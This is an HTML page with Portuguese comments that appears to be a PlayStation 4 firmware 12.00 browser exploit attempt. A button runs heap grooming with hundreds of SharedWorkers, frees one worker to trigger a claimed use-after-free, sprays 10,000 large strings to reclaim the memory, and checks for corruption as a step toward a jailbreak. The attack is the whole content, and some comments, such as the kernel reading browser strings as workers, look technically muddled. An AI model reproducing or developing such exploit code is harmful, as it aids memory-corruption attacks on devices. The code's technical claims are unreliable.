<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 String Spray</title>
   
</head>
<body>

    <h1>PS4 12.00 - STRING SPRAY</h1>
    <h3>Tática: Burlar IsoHeap com Strings Gigantes</h3>
    <div id="status">Pronto.</div>
    <div id="log"></div>
    <br>
    <button onclick="run_string_exploit()">INICIAR SPRAY</button>

    <script>
        function log(msg, type="") {
            var d = document.getElementById("log");
            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. CONSTRUTOR DE STRING FAKE
        // =================================================================
        var spray_strings = [];
        
        function make_huge_string() {
            // Cria uma string de aprox 0x400 bytes repetindo um padrão
            // Padrão: "AAAA" (0x41414141)
            // Se o Kernel ler isso como ponteiro, vai pular para 0x41414141 -> Crash
            // Se lermos de volta e tiver lixo, temos Leak.
            return "A".repeat(0x400 - 24); // -24 para cabeçalho da string
        }

        // =================================================================
        // 2. EXECUÇÃO
        // =================================================================
        var workers = [];

        async function run_string_exploit() {
            if(!window.SharedWorker) return log("Navegador incompatível.");
            
            var payload_str = make_huge_string();
            log("String Payload construída.", "success");

            // FASE 1: GROOMING
            log("Grooming (400)...");
            for(let i=0; i<400; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
            }

            // FASE 2: PRESSÃO (404)
            log("Zona de Pressão...");
            var p_count = 0;
            var it = setInterval(() => {
                if(p_count >= 4) {
                    clearInterval(it);
                    
                    log("!!! DISPARANDO UAF !!!");
                    
                    // 1. Libera Vítima
                    var v = workers.pop();
                    v.port.close();
                    v = null;

                    // 2. STRING SPRAY (Reclaim)
                    // Strings são tratadas diferentemente no Heap.
                    // Tentar forçar o alocador a colocar uma String onde estava o Worker.
                    log("Injetando Strings...");
                    
                    for(let k=0; k<10000; k++) {
                        // Criação dinâmica para evitar otimização do compilador JS
                        var s = payload_str + k.toString(); 
                        spray_strings.push(s);
                    }
                    
                    // 3. VERIFICAÇÃO (Passiva)
                    // Se o console não crashar imediatamente, tentamos ler as strings de volta
                    // para ver se alguma foi corrompida pelo "fantasma" do Worker.
                    check_corruption();
                    
                    return;
                }
                
                let w = new SharedWorker("data:text/javascript,1", "v"+p_count);
                w.port.start();
                workers.push(w);
                p_count++;
            }, 150);
        }

        function check_corruption() {
            log("Verificando integridade das Strings...");
            var corrupted = false;
            
            for(let i=0; i<spray_strings.length; i++) {
                var s = spray_strings[i];
                // Se a string não começar com "AAAA...", foi corrompida!
                if(s.charCodeAt(0) !== 65) { 
                    log("!!! STRING CORROMPIDA ENCONTRADA !!! Índice: " + i, "success");
                    log("Conteúdo: " + s.substring(0, 20), "success");
                    alert("JAILBREAK: Memory Leak Confirmado!");
                    corrupted = true;
                    break;
                }
            }
            
            if(!corrupted) {
                log("Nenhuma corrupção detectada. Tentando forçar uso...");
                // Se não corrompeu passivamente, o crash vai acontecer logo
                // porque o Kernel vai tentar ler a String achando que é um Worker.
                setTimeout(() => {
                    log("Se o console desligar agora, a String ocupou o lugar certo (mas como dados).");
                }, 2000);
            }
        }
    </script>
</body>
</html>
